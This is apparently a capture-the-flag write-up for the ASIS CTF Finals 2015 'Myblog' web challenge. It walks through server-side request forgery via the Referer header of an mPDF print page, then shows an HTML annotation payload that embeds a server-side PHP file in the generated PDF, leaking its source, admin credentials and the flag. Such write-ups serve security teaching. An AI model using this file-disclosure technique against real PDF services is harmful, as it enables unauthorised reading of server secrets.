---
title: "ASIS CTF Finals 2015 - Myblog (Web)"
header:
  overlay_image: /assets/images/asisfinals2015/myblog/header.jpg
  overlay_filter: 0.5
tags:
  - asisfinals2015
  - writeup
  - web
---

Server-side request forgery in a PDF page printer service in PHP leading to
disclosure of secrets in a server-side PHP source code.

## Challenge Description

#### Points

150

#### Solves

30

#### Description

```
Go there and find the flag.
```

## Solution

We are just given a link for this one: http://myblog.asis-ctf.ir:8088/. The web
app we have to attack is a simple PHP blog site.

![1]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/1.png){: .align-center}

If we visit a link, we have some very boring article text but at the bottom, we
have some interesting buttons to click.

![2]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/2.png){: .align-center}

Now, the page is vulnerable to reflected XSS in the id parameter. However, that
was simply a red herring. The real problem here was the 'Print' function. When
clicking, it makes a GET request to
`http://myblog.asis-ctf.ir:8088/printpage.php?id=2417648298`.

Let's investigate more.

![3]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/3.png){: .align-center}
![4]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/4.png){: .align-center}

So, a PDF is created of the page. The Referer field looks really interesting
here! Let's modify it to see if we can get it to render something arbitrary.

![5]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/5.png){: .align-center}
![6]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/6.png){: .align-center}

It's a little horrible to look at, but yes!, google.com is getting rendered.
Okay, but what can we render? Let's backtrack and try something elementary:
robots.txt.

![7]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/7.png){: .align-center}

If we try to navigate there...

![8]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/8.png){: .align-center}

But, let's use our printpage.php we found earlier to navigate instead.

![9]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/9.png){: .align-center}
![10]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/10.png){: .align-center}

Now, we need to find a way to log in. We don't have a username or password or
any idea of how to submit the form in the first place. However, if we download
the pdf, it's called mpdf.pdf. Unfortunately, there's no way to retrieve the
source code of the page in that.

We need something more. If we spend some time reading the mpdf manuals, we
eventually come across this page: http://mpdf1.com/manual/index.php?tid=284.

![11]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/11.png){: .align-center}

With this tag, we can include a file to be embedded inside the PDF document. So
what happens if we try to include `./myblog_private_dir3ct0ry/index.php`? We can
create this file and upload it on our own web server.

```html
<html>
    <head>
    </head>
    <body>
    <annotation content="wtf" file="./myblog_private_dir3ct0ry/index.php" />
    </body>
</html>
```

This should create an annotation in the created PDF that contains the source
code of the forbidden index.php.

![12]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/12.png){: .align-center}
![13]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/13.png){: .align-center}

Contained in the annotation shown above is the PHP code:

```php
<?php
    if (!preg_match('/87\.107\.123\..*/', $_SERVER['REMOTE_ADDR']) && !preg_match('/131\.72\.139\..*/', $_SERVER['REMOTE_ADDR']) && !preg_match('/192\.168\.1\..*/', $_SERVER['REMOTE_ADDR'])) {
        header('HTTP/1.0 403 Forbidden');
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /blog/admin/
on this server.<br />
</p>
</body></html>
<?php
        exit();
    }

    $error = false;
    if (isset($_REQUEST['username']) && isset($_REQUEST['password']) && isset($_REQUEST['login'])) {
        if ($_REQUEST['username'] === 'admin' && $_REQUEST['password'] === 'admin') {
?>
<html>
    <head>
        <title>My Blog - Admin Panel</title>
    </head>
    <body>
        <h1>ASIS{<?php echo md5('this is asis. not a simple ctf'); ?>}</h1>
    </body>
</html>
<?php
            exit();
        }
        $error = true;
    }
?>
<html>
    <head>
        <title>My blog - Admin Panel</title>
    </head>
    <body>
        <div>
            <h1>My Blog</h1>
            <h2>Admin Panel</h2>
            <?php echo ($error)?'<h3 style="color:red">Username or Password is wrong</h3>':''; ?>
        </div>
        <div>
            <form>
                <input type="text" name="username" placeholder="Username"/>
                <input type="text" name="password" placeholder="Password"/>
                <input type="submit" name="login" value="Login"/>
            </form>
        </div>
    </body>
</html>
```
We actually have our flag here, but let's take it all the way to the end. So,
all we need to do know to get the flag is submit a request with the parameters
"username=admin&password=admin&login".

![14]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/14.png){: .align-center}
![15]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/myblog/15.png){: .align-center}

And we have our flag: **ASIS{9c846eab5200c267cb593437780caa4d}**
